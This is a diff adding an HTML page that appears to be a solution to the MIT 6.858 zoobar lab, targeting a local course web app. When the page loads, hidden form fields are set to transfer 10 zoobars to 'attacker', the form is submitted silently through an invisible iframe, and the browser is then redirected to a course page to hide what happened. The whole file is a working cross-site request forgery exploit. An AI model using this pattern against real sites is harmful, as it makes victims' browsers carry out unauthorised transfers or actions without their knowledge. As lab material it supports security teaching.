@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+      function transfer() {
+        document.getElementsByName("zoobars")[0].value = "10";
+        document.getElementsByName("recipient")[0].value = "attacker";
+        document.getElementsByName("mitframe")[0].addEventListener("load", mit, false);
+        document.getElementsByName("transferform")[0].submit();
+      }
+
+      function mit() {
+        document.location = "http://css.csail.mit.edu/6.858/2013";
+      }
+    </script>
+  </head>
+  <body onload="transfer();">
+    <iframe style="visibility:hidden; height:0; width:0; position:absolute" name="mitframe" id="mitframe"></iframe>
+    <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="mitframe">
+      <input name="zoobars" type="text" value="" style="display:none">
+      <input name="recipient" type="text" value="" style="display:none">
+    </form>
+  </body>
+</html>
